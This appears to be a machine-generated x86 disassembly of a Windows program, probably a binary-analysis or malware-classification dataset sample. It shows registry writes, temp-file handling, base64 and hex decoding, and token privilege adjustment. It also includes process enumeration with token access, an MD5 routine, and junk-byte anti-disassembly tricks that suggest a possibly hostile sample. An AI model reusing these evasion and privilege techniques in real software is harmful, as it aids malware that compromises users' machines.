mov ecx [ ebp - 0x1018 ]
mov esi eax
mov edi [ rw-data ]
[ edi ] [ esi ]
push [ ebp - 0x101c ]
call GlobalUnlock
mov [ ebp - 0x1008 ] 0xfff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1008 ]
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp - 0x100c ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
jne r-xdata
mov [ ebp - 0x1020 ] eax
lea eax [ ebp - 0x1018 ]
push eax
push rw-data
push [ ebp - 0x1020 ]
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push [ ebp - 0x1020 ]
call sub_401835
cmp eax 0x1
jbe r-xdata
push eax
push [ ebp - 0x1018 ]
push eax
push [ ebp - 0x1010 ]
call sub_4014fb
lea eax [ ebp - 0x1018 ]
push eax
push rw-data
push [ ebp - 0x1020 ]
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
lea eax [ ebp - 0x1004 ]
push eax
call lstrlenA
inc eax
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp - 0x1014 ]
call sub_4014fb
cmp [ ebp - 0x1018 ] 0x1
jbe r-xdata
push eax
push eax
lea eax [ ebp - 0x1004 ]
push eax
call lstrlenA
push eax
lea eax [ ebp - 0x1004 ]
push eax
push [ ebp - 0x1014 ]
call sub_4014fb
pop eax
push [ ebp - 0x1018 ]
push eax
push [ ebp - 0x1014 ]
call sub_4014fb
call sub_401835
jmp r-xdata
call sub_401835
sub_402325
push ebp
mov ebp esp
add esp 0xfffffff8
push edi
mov [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_401d43
mov [ ebp - 0x4 ] eax
jmp r-xdata
or edi edi
jne r-xdata
mov edi [ rw-data ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x4 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edi [ edi ]
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
leave
retn 0x8
push [ ebp - 0x4 ]
call sub_402301
sub_4023a8
push ebp
mov ebp esp
push edi
push esi
push 0x0
push [ ebp + 0x8 ]
call sub_401d75
mov edi eax
push [ ebp + 0x8 ]
call lstrlenA
cmp eax 0x1
jbe r-xdata
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
push edi
cmp [ edi ] 0x22
jne r-xdata
push 0x5c
push 0x0
push edi
call StrRChrIA
or eax eax
je r-xdata
mov [ eax + 0x4 ] 0x0
pop edi
cld
lea esi [ edi + 0x1 ]
mov ecx eax
[ edi ] [ esi ]
mov [ edi ] 0x0
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
pop esi
pop edi
leave
retn 0x4
mov [ edi ] 0x0
push edi
call lstrlenA
cmp eax 0x3
ja r-xdata
sub_402414
push ebp
mov ebp esp
add esp 0xfffffffc
mov eax [ ebp + 0xc ]
add eax 0x1000
push eax
call sub_40184c
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_401883
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_402def
push [ ebp - 0x4 ]
call sub_401835
leave
retn 0xc
sub_402453
push ebp
mov ebp esp
push esi
push ebx
push edi
push [ ebp + 0x8 ]
call LoadLibraryA
nop
or eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
nop
mov ebx eax
nop
mov esi [ ebp + 0xc ]
pop edi
pop ebx
pop esi
leave
retn 0x8
mov eax 0x1
pop edi
pop ebx
pop esi
leave
retn 0x8
push edi
push ebx
call GetProcAddress
or eax eax
jne r-xdata
mov [ esi ] eax
add esi 0x4
jmp r-xdata
pop edi
pop ebx
pop esi
leave
retn 0x8
sub eax eax
cld
mov ecx 0xffffffff
nop
[ edi ]
nop
cmp [ edi ] 0x0
je r-xdata
sub_4024ad
push rw-data
push rw-data
call sub_402453
push rw-data
push rw-data
call sub_402453
push rw-data
push rw-data
call sub_402453
push rw-data
push rw-data
call sub_402453
push rw-data
push rw-data
call sub_402453
push rw-data
push rw-data
call sub_402453
push rw-data
push rw-data
call sub_402453
push rw-data
push rw-data
call sub_402453
retn
sub_402526
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or eax eax
je r-xdata
mov eax 0x0
leave
retn 0x4
cmp [ eax ] 0x0
jne r-xdata
sub edx edx
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ eax ] 0x5c
je r-xdata
mov eax edx
leave
retn 0x4
mov edx 0x1
jmp r-xdata
cmp [ eax ] 0x2f
jne r-xdata
inc eax
mov edx 0x0
sub_402564
push ebp
mov ebp esp
push edi
push esi
push ebx
mov eax [ ebp + 0xc ]
add eax 0x400
shl eax 0x1
push eax
call sub_40184c
mov edi eax
mov ebx eax
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
or ecx ecx
je r-xdata
or ecx ecx
je r-xdata
cmp [ esi ] 0xa
jne r-xdata
sub eax eax
stosb [ edi ]
test ecx ecx
jne r-xdata
movsb [ edi ] [ esi ]
dec ecx
movsb [ edi ] [ esi ]
dec ecx
jmp r-xdata
mov eax ebx
pop ebx
pop esi
pop edi
leave
retn 0x8
sub_4025a7
push ebx
push esi
mov ecx 0x4
nop
xor edx edx
nop
xor ebx ebx
nop
cmp al 0x2f
nop
jne r-xdata
nop
add edx 0x3e
nop
inc ebx
cmp al 0x30
nop
jl r-xdata
nop
add edx 0x3f
nop
inc ebx
cmp al 0x41
nop
jl r-xdata
cmp al 0x39
nop
jg r-xdata
cmp al 0x61
nop
jl r-xdata
cmp al 0x5a
nop
jg r-xdata
add al 0x4
add edx eax
inc ebx
rol edx 0x6
loop r-xdata
cmp al 0x7a
nop
jg r-xdata
sub al 0x41
nop
add edx eax
inc ebx
lodsb [ esi ]
nop
movzx eax al
nop
cmp al 0x2b
nop
jne r-xdata
ror edx 0x6
mov eax edx
bswap eax
shr eax 0x8
dec ebx
nop
mov ecx ebx
nop
pop esi
pop ebx
retn
sub al 0x47
add edx eax
inc ebx
sub_402616
push ebp
mov ebp esp
push ebx
push edi
push esi
cld
mov esi [ ebp + 0x8 ]
nop
mov edi [ ebp + 0x10 ]
nop
mov ecx [ ebp + 0xc ]
nop
xor ebx ebx
jecxz r-xdata
nop
mov eax ebx
nop
pop esi
pop edi
pop ebx
leave
retn 0xc
nop
push ecx
nop
call sub_4025a7
nop
test ecx ecx
jle r-xdata
nop
pop ecx
nop
add esi 0x4
nop
sub ecx 0x4
nop
jg r-xdata
stosb [ edi ]
shr eax 0x8
nop
inc ebx
loop r-xdata
sub_40265a
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
sub ebx ebx
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push [ rw-data ]
call RegCreateKeyA
or eax eax
jne r-xdata
or ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call RegSetValueExA
or eax eax
jne r-xdata
mov eax ebx
pop ebx
leave
retn 0xc
lea eax [ ebp - 0x10d ]
push eax
push 0x104
call GetTempPathA
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
inc ebx
cmp eax 0x104
ja r-xdata
push 0x0
lea eax [ ebp - 0x10d ]
push eax
call CreateDirectoryA
lea eax [ ebp - 0x10d ]
push eax
call sub_402526
or eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10d ]
push eax
call sub_401d75
push rw-data
lea eax [ ebp - 0x10d ]
push eax
call sub_401d75
push [ ebp + 0x8 ]
push eax
call sub_401dc9
jmp r-xdata
or ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
call sub_401422
mov ebx eax
push [ ebp - 0x8 ]
call CloseHandle
mov [ ebp - 0x114 ] eax
push 0x0
push 0x0
push 0x2
push 0x0
push 0x3
push 0xc0000000
push [ ebp - 0x114 ]
call CreateFileA
mov [ ebp - 0x8 ] eax
inc eax
je r-xdata
push [ ebp - 0x114 ]
call sub_401835
push [ ebp - 0x114 ]
call DeleteFileA
sub_402774
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
jne r-xdata
pop ebx
leave
retn 0x8
sub ebx ebx
lea eax [ ebp - 0x111 ]
push eax
push 0x104
call GetTempPathA
or eax eax
je r-xdata
mov eax ebx
cmp eax 0x104
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_401000
lea eax [ ebp - 0x111 ]
push eax
call sub_402526
or eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x111 ]
push eax
call sub_401d75
push rw-data
lea eax [ ebp - 0x111 ]
push eax
call sub_401d75
push [ ebp + 0x8 ]
push eax
call sub_401dc9
jmp r-xdata
call sub_401835
push [ ebp - 0x4 ]
call sub_401021
push [ ebp - 0x4 ]
call sub_401082
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push eax
push [ ebp - 0x4 ]
push eax
call sub_40120d
or eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp - 0xc ]
call GlobalLock
or eax eax
je r-xdata
push eax
push [ ebp - 0x8 ]
call sub_40184c
mov ebx eax
pop eax
push [ ebp - 0x8 ]
push ebx
push eax
call sub_401883
push [ ebp - 0xc ]
call GlobalUnlock
mov eax [ ebp + 0xc ]
push [ ebp - 0x8 ]
pop [ eax ]
sub_40287b
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
jmp r-xdata
cmp [ edi ] 0x20
je r-xdata
push edi
jmp r-xdata
cmp [ edi ] 0xd
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
cmp [ edi ] 0xa
je r-xdata
mov al [ edi + 0x1 ]
mov [ edi ] al
inc edi
pop edi
dec edi
inc edi
cmp [ edi ] 0x9
je r-xdata
mov edi [ ebp + 0x8 ]
pop edi
leave
retn 0x4
cmp [ eax + edi - 0x1 ] 0x20
je r-xdata
mov [ eax + edi - 0x1 ] 0x0
jmp r-xdata
cmp [ eax + edi - 0x1 ] 0xd
je r-xdata
jmp r-xdata
cmp [ eax + edi - 0x1 ] 0xa
je r-xdata
push [ ebp + 0x8 ]
call lstrlenA
cmp eax 0x0
jbe r-xdata
cmp [ eax + edi - 0x1 ] 0x9
jne r-xdata
jmp r-xdata
sub_4028e5
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
cmp [ rw-data ] 0x0
je r-xdata
sub eax eax
pop ebx
leave
retn 0x8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub ebx ebx
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
push 0x0
call [ rw-data ]
or eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call GetCurrentProcess
mov edx eax
lea eax [ ebp - 0xc ]
push eax
push 0x20
push edx
call [ rw-data ]
or eax eax
je r-xdata
mov eax ebx
pop ebx
leave
retn 0x8
push [ ebp - 0xc ]
call CloseHandle
push 0x0
push 0x0
push 0x10
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push [ ebp - 0xc ]
call [ rw-data ]
or eax eax
je r-xdata
mov [ ebp - 0x1c ] 0x1
push [ ebp - 0x8 ]
pop [ ebp - 0x18 ]
push [ ebp - 0x4 ]
pop [ ebp - 0x14 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub_40299a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call lstrlenA
inc eax
push eax
call sub_40184c
push eax
push [ ebp + 0x8 ]
push eax
call lstrcpyA
pop eax
leave
retn 0x4
sub_4029bb
push ebp
mov ebp esp
add esp 0xfffffffc
push ebx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
sub ebx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push 0x0
call WideCharToMultiByte
or eax eax
je r-xdata
sub eax eax
pop ebx
leave
retn 0x8
mov eax ebx
pop ebx
leave
retn 0x8
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
call sub_40184c
or eax eax
je r-xdata
mov ebx eax
push 0x0
push 0x0
push [ ebp - 0x4 ]
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push 0x0
call WideCharToMultiByte
or eax eax
jne r-xdata
push ebx
call sub_401835
sub ebx ebx
sub_402a38
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub eax eax
leave
retn 0x8
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call IsTextUnicode
or eax eax
je r-xdata
mov eax [ ebp + 0xc ]
inc eax
push eax
call sub_40184c
push eax
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_401883
pop eax
shr [ ebp + 0xc ] 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4029bb
jmp r-xdata
leave
retn 0x8
sub_402a8a
push ebp
mov ebp esp
push esi
push edi
push ebx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0x1
or eax eax
je r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi esi
jmp r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
or ebx ebx
jne r-xdata
mov ax [ esi ]
cmp ah 0x30
jb r-xdata
mov eax 0x1
pop ebx
pop edi
pop esi
leave
retn 0x8
cmp ah 0x41
jb r-xdata
cmp ah 0x39
ja r-xdata
cmp ah 0x61
jb r-xdata
cmp ah 0x46
ja r-xdata
sub ah 0x30
jmp r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
cmp ah 0x66
ja r-xdata
sub ah 0x41
add ah 0xa
jmp r-xdata
cmp al 0x30
jb r-xdata
sub ah 0x61
add ah 0xa
jmp r-xdata
cmp al 0x41
jb r-xdata
cmp al 0x39
ja r-xdata
cmp al 0x61
jb r-xdata
cmp al 0x46
ja r-xdata
sub al 0x30
jmp r-xdata
sub eax eax
pop ebx
pop edi
pop esi
leave
retn 0x8
cmp al 0x66
ja r-xdata
sub al 0x41
add al 0xa
jmp r-xdata
shl al 0x4
or al ah
stosb [ edi ]
dec ebx
dec ebx
add esi 0x2
sub al 0x61
add al 0xa
jmp r-xdata
sub_402b57
mov ebx 0x1
mov edi rw-data
push 0x1
push edi
call sub_4028e5
and ebx eax
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
mov eax ebx
pop ebx
pop edi
retn
sub_402b7e
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc [ ebx + 0x414af73d ]
add [ eax ] al
je r-xdata
retn
sub eax eax
pop ebx
leave
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub ebx ebx
call GetCurrentProcess
lea edx [ ebp - 0x4 ]
push edx
push 0x8
push eax
call [ rw-data ]
or eax eax
je r-xdata
mov eax ebx
pop ebx
leave
retn
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x1
push [ ebp - 0x4 ]
call [ rw-data ]
or eax eax
jne r-xdata
push [ ebp - 0x4 ]
call CloseHandle
call GetLastError
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call sub_40184c
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push 0x1
push [ ebp - 0x4 ]
call [ rw-data ]
or eax eax
je r-xdata
push [ ebp - 0xc ]
call sub_401835
mov eax [ ebp - 0xc ]
mov edx [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push edx
call [ rw-data ]
or eax eax
je r-xdata
push rw-data
push [ ebp - 0x10 ]
call lstrcmpA
or eax eax
jne r-xdata
push [ ebp - 0x10 ]
call LocalFree
inc ebx
sub_402c64
push ebp
mov ebp esp
add esp 0xfffffec0
push ebx
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc [ ebx + 0x414abb3d ]
add [ eax ] al
je r-xdata
retn
sub eax eax
pop ebx
leave
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub ebx ebx
call [ rw-data ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x134 ] 0x128
push 0x0
push 0x2
call CreateToolhelp32Snapshot
cmp eax 0xffffffff
je r-xdata
mov eax ebx
pop ebx
leave
retn
mov [ ebp - 0x138 ] eax
lea eax [ ebp - 0x134 ]
push eax
push [ ebp - 0x138 ]
call Process32First
push [ ebp - 0x138 ]
call CloseHandle
push rw-data
lea eax [ ebp - 0x110 ]
push eax
call StrStrIA
or eax eax
je r-xdata
lea eax [ ebp - 0x134 ]
push eax
push [ ebp - 0x138 ]
call Process32Next
jmp r-xdata
mov [ ebp - 0x13c ] 0x0
lea eax [ ebp - 0x13c ]
push eax
push [ ebp - 0x12c ]
call [ rw-data ]
mov edx [ ebp - 0x13c ]
or eax eax
je r-xdata
or eax eax
je r-xdata
cmp edx [ ebp - 0xc ]
jne r-xdata
push [ ebp - 0x12c ]
push 0x0
push 0x2000000
call OpenProcess
or eax eax
je r-xdata
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x201eb
push [ ebp - 0x8 ]
call [ rw-data ]
or eax eax
je r-xdata
push [ ebp - 0x8 ]
call CloseHandle
push [ ebp - 0x4 ]
call [ rw-data ]
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call CloseHandle
push [ ebp - 0x8 ]
call CloseHandle
jmp r-xdata
inc ebx
mov [ ebp - 0x140 ] 0x0
lea eax [ ebp - 0x140 ]
push eax
push 0xf003f
call RegOpenCurrentUser
or eax eax
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x140 ] 0x0
je r-xdata
push [ ebp - 0x140 ]
pop [ rw-data ]
sub_402def
push ebp
mov ebp esp
add esp 0xffffffec
push eax
push ebx
push ecx
push edx
push edi
push esi
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x80 ]
lea edx [ eax * 8 ]
mov ebx eax
mov ecx eax
shr eax 0x6
mov [ ebp - 0x14 ] eax
mov edi [ ebp + 0x8 ]
add edi ecx
mov [ edi ] 0x80
and ebx 0x3f
sub edi ebx
cmp ebx 0x38
jb r-xdata
mov [ edi + 0x38 ] edx
lea esi [ ebp - 0x10 ]
mov [ esi ] 0x67452301
mov [ esi + 0x4 ] 0xefcdab89
mov [ esi + 0x8 ] 0x98badcfe
mov [ esi + 0xc ] 0x10325476
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_402e7a
cld
mov ecx 0x4
mov edi [ ebp + 0x10 ]
[ edi ] [ esi ]
pop esi
pop edi
pop edx
pop ecx
pop ebx
pop eax
leave
retn 0xc
add edi ebx
mov eax 0x40
sub eax ebx
add edi eax
inc [ ebp - 0x14 ]
sub_402e7a
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push eax
push ebx
push ecx
push edx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov ebx [ edi + 0x4 ]
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0xc ]
mov edi ecx
xor edi edx
and edi ebx
xor edi edx
lea eax [ edi + eax - 0x28955b88 ]
add eax [ esi ]
rol eax 0x7
add eax ebx
mov edi ebx
xor edi ecx
and edi eax
xor edi ecx
lea edx [ edi + edx - 0x173848aa ]
add edx [ esi + 0x4 ]
rol edx 0xc
add edx eax
mov edi eax
xor edi ebx
and edi edx
xor edi ebx
lea ecx [ edi + ecx + 0x242070db ]
add ecx [ esi + 0x8 ]
rol ecx 0x11
add ecx edx
mov edi edx
xor edi eax
and edi ecx
xor edi eax
lea ebx [ edi + ebx - 0x3e423112 ]
add ebx [ esi + 0xc ]
rol ebx 0x16
add ebx ecx
mov edi ecx
xor edi edx
and edi ebx
xor edi edx
lea eax [ edi + eax - 0xa83f051 ]
add eax [ esi + 0x10 ]
rol eax 0x7
add eax ebx
mov edi ebx
xor edi ecx
and edi eax
xor edi ecx
lea edx [ edi + edx + 0x4787c62a ]
add edx [ esi + 0x14 ]
rol edx 0xc
add edx eax
mov edi eax
xor edi ebx
and edi edx
xor edi ebx
lea ecx [ edi + ecx - 0x57cfb9ed ]
add ecx [ esi + 0x18 ]
rol ecx 0x11
add ecx edx
mov edi edx
xor edi eax
and edi ecx
xor edi eax
lea ebx [ edi + ebx - 0x2b96aff ]
add ebx [ esi + 0x1c ]
rol ebx 0x16
add ebx ecx
mov edi ecx
xor edi edx
and edi ebx
xor edi edx
lea eax [ edi + eax + 0x698098d8 ]
add eax [ esi + 0x20 ]
rol eax 0x7
add eax ebx
mov edi ebx
xor edi ecx
and edi eax
xor edi ecx
lea edx [ edi + edx - 0x74bb0851 ]
add edx [ esi + 0x24 ]
rol edx 0xc
add edx eax
mov edi eax
xor edi ebx
and edi edx
xor edi ebx
lea ecx [ edi + ecx - 0xa44f ]
add ecx [ esi + 0x28 ]
rol ecx 0x11
add ecx edx
mov edi edx
xor edi eax
and edi ecx
xor edi eax
lea ebx [ edi + ebx - 0x76a32842 ]
add ebx [ esi + 0x2c ]
rol ebx 0x16
add ebx ecx
mov edi ecx
xor edi edx
and edi ebx
xor edi edx
lea eax [ edi + eax + 0x6b901122 ]
add eax [ esi + 0x30 ]
rol eax 0x7
add eax ebx
mov edi ebx
xor edi ecx
and edi eax
xor edi ecx
lea edx [ edi + edx - 0x2678e6d ]
add edx [ esi + 0x34 ]
rol edx 0xc
add edx eax
mov edi eax
xor edi ebx
and edi edx
xor edi ebx
lea ecx [ edi + ecx - 0x5986bc72 ]
add ecx [ esi + 0x38 ]
rol ecx 0x11
add ecx edx
mov edi edx
xor edi eax
and edi ecx
xor edi eax
lea ebx [ edi + ebx + 0x49b40821 ]
add ebx [ esi + 0x3c ]
rol ebx 0x16
add ebx ecx
mov edi ecx
xor edi ebx
and edi edx
xor edi ecx
lea eax [ edi + eax - 0x9e1da9e ]
add eax [ esi + 0x4 ]
rol eax 0x5
add eax ebx
mov edi ebx
xor edi eax
and edi ecx
xor edi ebx
lea edx [ edi + edx - 0x3fbf4cc0 ]
add edx [ esi + 0x18 ]
rol edx 0x9
add edx eax
mov edi eax
xor edi edx
and edi ebx
xor edi eax
lea ecx [ edi + ecx + 0x265e5a51 ]
add ecx [ esi + 0x2c ]
rol ecx 0xe
add ecx edx
mov edi edx
xor edi ecx
and edi eax
xor edi edx
lea ebx [ edi + ebx - 0x16493856 ]
add ebx [ esi ]
rol ebx 0x14
add ebx ecx
mov edi ecx
xor edi ebx
and edi edx
xor edi ecx
lea eax [ edi + eax - 0x29d0efa3 ]
add eax [ esi + 0x14 ]
rol eax 0x5
add eax ebx
mov edi ebx
xor edi eax
and edi ecx
xor edi ebx
lea edx [ edi + edx + 0x2441453 ]
add edx [ esi + 0x28 ]
rol edx 0x9
add edx eax
mov edi eax
xor edi edx
and edi ebx
xor edi eax
lea ecx [ edi + ecx - 0x275e197f ]
add ecx [ esi + 0x3c ]
rol ecx 0xe
add ecx edx
mov edi edx
xor edi ecx
and edi eax
xor edi edx
lea ebx [ edi + ebx - 0x182c0438 ]
add ebx [ esi + 0x10 ]
rol ebx 0x14
add ebx ecx
mov edi ecx
xor edi ebx
and edi edx
xor edi ecx
lea eax [ edi + eax + 0x21e1cde6 ]
add eax [ esi + 0x24 ]
rol eax 0x5
add eax ebx
mov edi ebx
xor edi eax
and edi ecx
xor edi ebx
lea edx [ edi + edx - 0x3cc8f82a ]
add edx [ esi + 0x38 ]
rol edx 0x9
add edx eax
mov edi eax
xor edi edx
and edi ebx
xor edi eax
lea ecx [ edi + ecx - 0xb2af279 ]
add ecx [ esi + 0xc ]
rol ecx 0xe
add ecx edx
mov edi edx
xor edi ecx
and edi eax
xor edi edx
lea ebx [ edi + ebx + 0x455a14ed ]
add ebx [ esi + 0x20 ]
rol ebx 0x14
add ebx ecx
mov edi ecx
xor edi ebx
and edi edx
xor edi ecx
lea eax [ edi + eax - 0x561c16fb ]
add eax [ esi + 0x34 ]
rol eax 0x5
add eax ebx
mov edi ebx
xor edi eax
and edi ecx
xor edi ebx
lea edx [ edi + edx - 0x3105c08 ]
add edx [ esi + 0x8 ]
rol edx 0x9
add edx eax
mov edi eax
xor edi edx
and edi ebx
xor edi eax
lea ecx [ edi + ecx + 0x676f02d9 ]
add ecx [ esi + 0x1c ]
rol ecx 0xe
add ecx edx
mov edi edx
xor edi ecx
and edi eax
xor edi edx
lea ebx [ edi + ebx - 0x72d5b376 ]
add ebx [ esi + 0x30 ]
rol ebx 0x14
add ebx ecx
mov edi ecx
xor edi edx
xor edi ebx
lea eax [ edi + eax - 0x5c6be ]
add eax [ esi + 0x14 ]
rol eax 0x4
add eax ebx
mov edi ebx
xor edi ecx
xor edi eax
lea edx [ edi + edx - 0x788e097f ]
add edx [ esi + 0x20 ]
rol edx 0xb
add edx eax
mov edi eax
xor edi ebx
xor edi edx
lea ecx [ edi + ecx + 0x6d9d6122 ]
add ecx [ esi + 0x2c ]
rol ecx 0x10
add ecx edx
mov edi edx
xor edi eax
xor edi ecx
lea ebx [ edi + ebx - 0x21ac7f4 ]
add ebx [ esi + 0x38 ]
rol ebx 0x17
add ebx ecx
mov edi ecx
xor edi edx
xor edi ebx
lea eax [ edi + eax - 0x5b4115bc ]
add eax [ esi + 0x4 ]
rol eax 0x4
add eax ebx
mov edi ebx
xor edi ecx
xor edi eax
lea edx [ edi + edx + 0x4bdecfa9 ]
add edx [ esi + 0x10 ]
rol edx 0xb
add edx eax
mov edi eax
xor edi ebx
xor edi edx
lea ecx [ edi + ecx - 0x944b4a0 ]
add ecx [ esi + 0x1c ]
rol ecx 0x10
add ecx edx
mov edi edx
xor edi eax
xor edi ecx
lea ebx [ edi + ebx - 0x41404390 ]
add ebx [ esi + 0x28 ]
rol ebx 0x17
add ebx ecx
mov edi ecx
xor edi edx
xor edi ebx
lea eax [ edi + eax + 0x289b7ec6 ]
add eax [ esi + 0x34 ]
rol eax 0x4
add eax ebx
mov edi ebx
xor edi ecx
xor edi eax
lea edx [ edi + edx - 0x155ed806 ]
add edx [ esi ]
rol edx 0xb
add edx eax
mov edi eax
xor edi ebx
xor edi edx
lea ecx [ edi + ecx - 0x2b10cf7b ]
add ecx [ esi + 0xc ]
rol ecx 0x10
add ecx edx
mov edi edx
xor edi eax
xor edi ecx
lea ebx [ edi + ebx + 0x4881d05 ]
add ebx [ esi + 0x18 ]
rol ebx 0x17
add ebx ecx
mov edi ecx
xor edi edx
xor edi ebx
lea eax [ edi + eax - 0x262b2fc7 ]
add eax [ esi + 0x24 ]
rol eax 0x4
add eax ebx
mov edi ebx
xor edi ecx
xor edi eax
lea edx [ edi + edx - 0x1924661b ]
add edx [ esi + 0x30 ]
rol edx 0xb
add edx eax
mov edi eax
xor edi ebx
xor edi edx
lea ecx [ edi + ecx + 0x1fa27cf8 ]
add ecx [ esi + 0x3c ]
rol ecx 0x10
add ecx edx
mov edi edx
xor edi eax
xor edi ecx
lea ebx [ edi + ebx - 0x3b53a99b ]
add ebx [ esi + 0x8 ]
rol ebx 0x17
add ebx ecx
mov edi 0xffffffff
xor edi edx
or edi ebx
xor edi ecx
lea eax [ edi + eax - 0xbd6ddbc ]
add eax [ esi ]
rol eax 0x6
add eax ebx
mov edi 0xffffffff
xor edi ecx
or edi eax
xor edi ebx
lea edx [ edi + edx + 0x432aff97 ]
add edx [ esi + 0x1c ]
rol edx 0xa
add edx eax
mov edi 0xffffffff
xor edi ebx
or edi edx
xor edi eax
lea ecx [ edi + ecx - 0x546bdc59 ]
add ecx [ esi + 0x38 ]
rol ecx 0xf
add ecx edx
mov edi 0xffffffff
xor edi eax
or edi ecx
xor edi edx
lea ebx [ edi + ebx - 0x36c5fc7 ]
add ebx [ esi + 0x14 ]
rol ebx 0x15
add ebx ecx
mov edi 0xffffffff
xor edi edx
or edi ebx
xor edi ecx
lea eax [ edi + eax + 0x655b59c3 ]
add eax [ esi + 0x30 ]
rol eax 0x6
add eax ebx
mov edi 0xffffffff
xor edi ecx
or edi eax
xor edi ebx
lea edx [ edi + edx - 0x70f3336e ]
add edx [ esi + 0xc ]
rol edx 0xa
add edx eax
mov edi 0xffffffff
xor edi ebx
or edi edx
xor edi eax
lea ecx [ edi + ecx - 0x100b83 ]
add ecx [ esi + 0x28 ]
rol ecx 0xf
add ecx edx
mov edi 0xffffffff
xor edi eax
or edi ecx
xor edi edx
